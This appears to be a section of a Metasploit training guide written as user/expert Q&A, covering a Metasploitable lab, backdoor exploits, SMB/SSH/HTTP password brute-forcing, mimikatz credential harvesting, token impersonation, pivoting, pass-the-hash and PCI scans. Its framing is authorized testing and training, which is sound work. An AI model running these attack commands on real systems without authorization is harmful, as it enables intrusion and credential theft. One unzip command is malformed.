# Scenario Examples

## 9.1 CTF & Training Scenarios

### Setting Up a Metasploit Lab

**User:** "How do I practice Metasploit safely?"

**Expert:**
> **Recommended Training Platforms:**
>
> 1. **VulnHub VMs**
>    - Download from vulnhub.com
>    - Import to VirtualBox/VMware
>    - Run Metasploit against them
>
> 2. **HackTheBox**
>    - Active targets
>    - Metasploit modules often applicable
>    - Community writeups for learning
>
> 3. **TryHackMe**
>    - Guided Metasploit rooms
>    - Step-by-step learning path
>
> 4. **Metasploitable 2/3**
>    ```bash
>    # Download Metasploitable 2
>    wget https://download.vulnhub.com/metasploitable/metasploitable-linux-2.0.0.zip
>    unzip -p ' ' > metasploitable2.vmdk
>    # Import to VM
>    ```
>
> **Lab Network Setup:**
> ```
> [Kali Linux]  <--->  [Metasploitable VM]
>    192.168.56.1         192.168.56.102
>         |
>    Metasploit
>    (Attacker)
> ```

### Basic Exploitation Walkthrough

**User:** "Walk me through exploiting Metasploitable 2"

**Expert:**
> **Lab: Metasploitable 2 Exploitation**
>
> **Step 1: Discovery**
> ```bash
> db_nmap -sS 192.168.56.102 -oA metasploitable_discovery
> services 192.168.56.102
> ```
>
> **Step 2: Check for VSFTPD (port 21)**
> ```bash
> search vsftpd
> use exploit/unix/ftp/vsftpd_234_backdoor
> set RHOSTS 192.168.56.102
> run
> ```
>
> **Step 3: Alternative - Unreal IRCd**
> ```bash
> search unreal ircd
> use exploit/unix/irc/unreal_ircd_3281_backdoor
> set RHOSTS 192.168.56.102
> run
> ```
>
> **Step 4: Post-Exploitation**
> ```bash
> # In meterpreter session
> sysinfo
> getuid
> shell
> cat /etc/passwd
> ```
>
> **Step 5: Pivot (if needed)**
> ```bash
> # After getting shell
> run post/multi/manage/autoroute
> # Or use auxiliary/server/socks4a
> ```

## 9.2 Bug Bounty & Penetration Test Workflows

### Credential stuffing with Metasploit

**User:** "How do I use Metasploit for credential testing?"

**Expert:**
> **Credential Attack Workflow:**
>
> 1. **Prepare wordlists**
> ```bash
> # Default Metasploit wordlists
> ls /usr/share/wordlists/metasploit/
> # user.txt, password.txt, unix_passwords.txt
> ```
>
> 2. **SMB Login Scanner**
> ```bash
> use auxiliary/scanner/smb/smb_login
> set RHOSTS 10.0.0.0/24
> set USER_FILE /usr/share/wordlists/metasploit/user.txt
> set PASS_FILE /usr/share/wordlists/metasploit/password.txt
> set STOP_ON_SUCCESS true
> run
> ```
>
> 3. **SSH Login Scanner**
> ```bash
> use auxiliary/scanner/ssh/ssh_login
> set RHOSTS 10.0.0.100
> set USERNAME root
> set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
> run
> ```
>
> 4. **HTTP Basic Auth**
> ```bash
> use auxiliary/scanner/http/http_login
> set RHOSTS 10.0.0.100
> set RPORT 8080
> set PASS_FILE /usr/share/wordlists/metasploit/password.txt
> run
> ```
>
> **Important:** Only test systems you own or have written authorization for!

### Lateral Movement Workflow

**User:** "How do I pivot after getting initial access?"

**Expert:**
> **Post-Exploitation & Pivoting:**
>
> **Step 1: Enumerate**
> ```bash
> # Meterpreter session
> run post/windows/gather/enum_patches
> run post/windows/gather/enum_shares
> run post/windows/gather/checkvm
> run post/multi/recon/local_exploit_suggester
> ```
>
> **Step 2: Credential Harvesting**
> ```bash
> run post/windows/manage/mimikatz
> # or
> run post/windows/gather/credentials/credential_collector
> ```
>
> **Step 3: Token Impersonation**
> ```bash
> use incognito
> list_tokens -u
> impersonate_token DOMAIN\\admin_user
> ```
>
> **Step 4: Setup Pivot**
> ```bash
> # Method 1: Autoroute
> run post/multi/manage/autoroute SESSION=1 SUBNET=10.1.1.0
>
> # Method 2: SOCKS proxy
> use auxiliary/server/socks4a
> set SRVPORT 1080
> run
>
> # Then use proxychains
> proxychains nmap -sT 10.1.1.50 -p 445
> ```
>
> **Step 5: Pass the Hash**
> ```bash
> use exploit/windows/smb/psexec
> set SMBUser Administrator
> set SMBPass <LM:NTLM hash>
> set SMBDomain WORKGROUP
> run
> ```

## 9.3 Compliance Scanning

### PCI-DSS Internal Network Testing

**User:** "How do I document Metasploit findings for PCI compliance?"

**Expert:**
> **PCI-DSS Requirement 11.2/11.3 Workflow:**
>
> 1. **Pre-Assessment Setup**
> ```bash
> workspace -a PCIPentest_Q1_2024
> db_import nmap_internal.xml
>
> # Tag CDE hosts
> hosts -t pci-cde 10.1.2.0/24
> ```
>
> 2. **Internal Network Scanning**
> ```bash
> # Run service version scans
> db_nmap -sV -O 10.1.2.0/24 -oA pci_services
>
> # Vulnerability identification
> use auxiliary/scanner/smb/smb_ms17_010
> set RHOSTS 10.1.2.0/24
> run
>
> use auxiliary/scanner/mysql/mysql_enum
> set RHOSTS 10.1.2.0/24
> run
> ```
>
> 3. **Report Mapping**
> ```markdown
> | Finding | CVSS | PCI Req | Remediation |
> |---------|------|---------|-------------|
> | SMB v1 enabled | 9.8 | 2.1 | Disable SMBv1 |
> | MySQL anonymous access | 7.5 | 8.3 | Require auth |
> | Outdated OpenSSL | 7.5 | 6.3 | Update to TLS 1.2+ |
> ```
>
> 4. **Evidence Export**
> ```bash
> # Export for compliance report
> db_export -f xml pci_scan_results.xml
> hosts -c address,os_flavor,vulns > pci_hosts.csv
> vulns -c host,name,cvss,refs > pci_vulns.csv
> ```

### Security Audit Export

```bash
# Generate comprehensive audit
workspace PentestAudit2024

# Import scan data
db_import /scans/nmap/full_scan.xml

# Run assessment modules
use auxiliary/scanner/discovery/arp_sweep
run

use auxiliary/scanner/smb/smb_enumusers_domain
run

# Export all data
db_export -f xml pentest_2024_audit.xml
loot -t credentials
loot -t hashes
notes

# Create executive summary
# (Manual step - Metasploit doesn't auto-generate exec reports)
```

### Continuous Vulnerability Monitoring

```bash
# Resource script for scheduled scans
# scan_schedule.rc

workspace -a WeeklyScan
setg RHOSTS 10.0.0.0/24
setg THREADS 50

# Weekly vulnerability checks
use auxiliary/scanner/smb/smb_ms17_010
run

use auxiliary/scanner/http/cert
run

# Export for tracking
db_export -f xml weekly_scan_$(date +%Y%m%d).xml
```
